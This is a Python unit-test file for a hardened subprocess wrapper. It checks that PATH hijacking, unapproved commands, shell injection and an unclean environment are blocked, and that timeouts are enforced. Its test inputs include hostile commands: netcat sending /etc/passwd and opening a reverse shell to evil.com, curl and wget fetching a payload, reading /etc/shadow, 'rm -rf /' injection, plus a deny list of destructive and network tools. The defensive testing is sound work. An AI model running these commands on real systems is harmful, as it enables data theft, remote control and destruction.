"""
Subprocess Security Tests - Phase 49
=====================================

Tests for subprocess hardening:
1. PATH hijack prevention
2. Unapproved command blocking
3. Timeout enforcement
4. Clean environment validation
"""

import unittest
import os
import sys
from pathlib import Path
from unittest.mock import patch, MagicMock


# Add runtime to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from impl_v1.phase49.runtime.secure_subprocess import (
    secure_run,
    is_command_approved,
    get_approved_commands,
    ExecStatus,
    SecureResult,
    _get_clean_environment,
    _validate_command,
)


class TestPATHHijackPrevention(unittest.TestCase):
    """Test: PATH hijack is not possible."""
    
    def test_relative_command_blocked(self):
        """Relative command path is blocked."""
        result = secure_run(["./malicious_script"])
        self.assertEqual(result.status, ExecStatus.BLOCKED)
        self.assertIn("not approved", result.stderr)
    
    def test_command_name_only_blocked(self):
        """Command name without path is blocked for unapproved commands."""
        result = secure_run(["rm", "-rf", "/"])
        self.assertEqual(result.status, ExecStatus.BLOCKED)
    
    def test_path_traversal_blocked(self):
        """Path traversal attack is blocked."""
        result = secure_run(["../../../bin/sh"])
        self.assertEqual(result.status, ExecStatus.BLOCKED)
    
    def test_shell_injection_blocked(self):
        """Shell injection via command is blocked."""
        result = secure_run(["xprintidle; rm -rf /"])
        self.assertEqual(result.status, ExecStatus.BLOCKED)
    
    def test_pipe_injection_blocked(self):
        """Pipe injection is blocked (shell=False)."""
        result = secure_run(["cat", "/etc/passwd", "|", "nc", "evil.com", "1234"])
        self.assertEqual(result.status, ExecStatus.BLOCKED)


class TestApprovedCommandsOnly(unittest.TestCase):
    """Test: Only approved commands can execute."""
    
    def test_arbitrary_command_blocked(self):
        """Arbitrary command is blocked."""
        result = secure_run(["/bin/sh", "-c", "id"])
        self.assertEqual(result.status, ExecStatus.BLOCKED)
    
    def test_curl_blocked(self):
        """curl is blocked (network access)."""
        result = secure_run(["curl", "http://evil.com/payload"])
        self.assertEqual(result.status, ExecStatus.BLOCKED)
    
    def test_wget_blocked(self):
        """wget is blocked."""
        result = secure_run(["wget", "http://evil.com/payload"])
        self.assertEqual(result.status, ExecStatus.BLOCKED)
    
    def test_python_blocked(self):
        """python interpreter is blocked."""
        result = secure_run(["python", "-c", "import os; os.system('id')"])
        self.assertEqual(result.status, ExecStatus.BLOCKED)
    
    def test_bash_blocked(self):
        """bash is blocked."""
        result = secure_run(["bash", "-c", "cat /etc/shadow"])
        self.assertEqual(result.status, ExecStatus.BLOCKED)
    
    def test_nc_blocked(self):
        """netcat is blocked."""
        result = secure_run(["nc", "-e", "/bin/sh", "evil.com", "4444"])
        self.assertEqual(result.status, ExecStatus.BLOCKED)


class TestTimeoutEnforcement(unittest.TestCase):
    """Test: Timeout is enforced."""
    
    def test_timeout_enforced(self):
        """Command timeout is enforced."""
        # Create a mock that simulates timeout
        with patch('impl_v1.phase49.runtime.secure_subprocess.subprocess.run') as mock_run:
            import subprocess
            mock_run.side_effect = subprocess.TimeoutExpired(cmd=["sleep"], timeout=5)
            
            # Also patch validation to allow the command
            with patch('impl_v1.phase49.runtime.secure_subprocess._validate_command') as mock_validate:
                mock_validate.return_value = "/usr/bin/sleep"
                
                result = secure_run(["sleep", "100"], timeout=5)
                self.assertEqual(result.status, ExecStatus.TIMEOUT)
    
    def test_max_timeout_enforced(self):
        """Maximum timeout is capped."""
        # Even if 1000s is requested, it should be capped to MAX_TIMEOUT_SECONDS
        from impl_v1.phase49.runtime.secure_subprocess import MAX_TIMEOUT_SECONDS
        
        # Verify constant exists and is reasonable
        self.assertLessEqual(MAX_TIMEOUT_SECONDS, 60)


class TestCleanEnvironment(unittest.TestCase):
    """Test: Environment is clean."""
    
    def test_no_path_in_environment(self):
        """PATH is not passed to subprocess."""
        clean_env = _get_clean_environment()
        self.assertNotIn("PATH", clean_env)
    
    def test_no_ld_preload_in_environment(self):
        """LD_PRELOAD is not passed to subprocess."""
        clean_env = _get_clean_environment()
        self.assertNotIn("LD_PRELOAD", clean_env)
    
    def test_no_ld_library_path_in_environment(self):
        """LD_LIBRARY_PATH is not passed to subprocess."""
        clean_env = _get_clean_environment()
        self.assertNotIn("LD_LIBRARY_PATH", clean_env)
    
    def test_minimal_environment(self):
        """Environment contains only essential variables."""
        clean_env = _get_clean_environment()
        # Should only have X11/systemd variables if present
        allowed = {"DISPLAY", "XAUTHORITY", "XDG_RUNTIME_DIR"}
        for key in clean_env:
            self.assertIn(key, allowed, f"Unexpected env var: {key}")


class TestEmptyCommandBlocked(unittest.TestCase):
    """Test: Empty commands are blocked."""
    
    def test_empty_list_blocked(self):
        """Empty command list is blocked."""
        result = secure_run([])
        self.assertEqual(result.status, ExecStatus.BLOCKED)
    
    def test_empty_string_blocked(self):
        """Empty string command is blocked."""
        result = secure_run([""])
        self.assertEqual(result.status, ExecStatus.BLOCKED)


class TestValidationFunctions(unittest.TestCase):
    """Test: Validation helper functions."""
    
    def test_unapproved_command_not_validated(self):
        """Unapproved command returns None."""
        result = _validate_command("malicious_binary")
        self.assertIsNone(result)
    
    def test_dangerous_command_not_approved(self):
        """Dangerous commands are not in approved list."""
        dangerous = ["rm", "dd", "mkfs", "fdisk", "nc", "ncat", "curl", "wget"]
        for cmd in dangerous:
            self.assertFalse(is_command_approved(cmd), f"{cmd} should not be approved")


if __name__ == "__main__":
    unittest.main()
